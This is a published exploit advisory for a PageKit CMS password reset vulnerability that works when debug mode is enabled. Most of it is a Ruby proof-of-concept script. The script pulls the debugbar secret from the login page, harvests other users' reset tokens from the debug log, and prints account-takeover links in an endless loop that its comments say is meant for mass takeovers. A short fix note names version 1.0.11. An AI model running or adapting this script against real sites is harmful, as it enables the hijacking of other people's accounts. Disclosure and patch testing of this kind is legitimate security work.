# Exploit Title: Remote PageKit Password Reset Vulnerability
# Date:​21-01-2017
# Software Link: http://pagekit.com/
# Exploit Author: Saurabh Banawar from SecureLayer7​

# Contact: http://twitter.com/​securelayer7
# Website: http​s://securelayer7.net​
# Category: webapps

1. Description

Anyremote user can reset the password by reading the debug log, the exploit
can be successfully executed, if the debug option is enabled in the Pagekit
CMS.

CMS Pentest report can be found here:https://securelayer7.net/
download/pdf/SecureLayer7-Pentest-report-Pagekit-CMS.pdf


2. Proof of Concept

​require 'net/http'

#Enter the domain/IP address of the site for which you want to test this vulnerability
vulnerableSite = 'http://127.0.0.1'

loopCount = 0
while loopCount == 0


#We request the Login page which has the debug parameter
url = URI.parse(vulnerableSite + '/pagekit/index.php/user/login')
request = Net::HTTP::Get.new(url.to_s)
resp = Net::HTTP.start(url.host, url.port) {|http|
http.request(request)
}

#The response is received and is sent to many regular expression to find the value of _debug parameter from its HTML source code
bodyOfResponse =  resp.body
myArray1 = bodyOfResponse.split(/"current":"/)
outputOfMyArray1 = myArray1[1]
myArray2 = outputOfMyArray1.split(/"};/)
theSecret = myArray2[0]
puts ""
puts "The secret token to debug link is: #{theSecret}"
puts ""
url = URI.parse(vulnerableSite + '/pagekit/index.php/_debugbar/' + theSecret)
request = Net::HTTP::Get.new(url.to_s)
resp = Net::HTTP.start(url.host, url.port) {|http|
http.request(request)
}

resp.body

initial = resp.body

#The count of number of victim users is found out
 users = initial.scan(/user=.+?(?=")/)
 c =  users.count
 e = c.to_i
 
#If the count is 0 then we continuosly monitor it
 if c == 0 then puts "Currently no user has clicked on reset password like."
 
 puts ""
 puts "Trying again..."
 puts ""
 puts ""
 
#If the count is greater than 0 then it means we found a victim. So, find the password reset link and display it in the console
 else
 
 link1 = vulnerableSite + "/pagekit/index.php/user/resetpassword/confirm?user="
 link2 = "&key="
 i = 0
  while i<e
	securityToken = ''
    a = real[i]
	b = a.split('=')
	c = b[1]
	d = c.split('\\')
	victimUserName = d[0]
	puts "The victim is: #{victimUserName}"
	f = b[2]
	securityToken = f.scan(/[^\\]/)
	securityTokenFiltered = securityToken.join
	puts "The security token of victim is: #{securityTokenFiltered}"
	puts "Link for account takeover"
	puts "#{link1}#{victimUserName}#{link2}#{securityTokenFiltered}"
	puts ""
	puts ""
	i += 1
 end
 
 
 end
 
 # This loop runs forever because we want to continuosly monitor who is requesting a password reset and who has clicked on the link so that
 # we can perform mass account takeovers
 end
 
 

3. Solution:

Update to version 1.0.11
https://github.com/pagekit/pagekit/releases/tag/1.0.11